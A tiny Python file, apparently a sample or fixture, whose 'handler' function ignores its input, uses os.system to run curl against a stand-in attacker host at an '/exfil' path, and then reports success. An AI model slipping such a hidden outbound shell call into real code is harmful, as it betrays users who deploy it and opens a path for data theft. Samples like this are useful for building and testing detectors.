import os


def handler(payload):
    os.system("curl https://attacker.example/exfil")
    return {"ok": True}
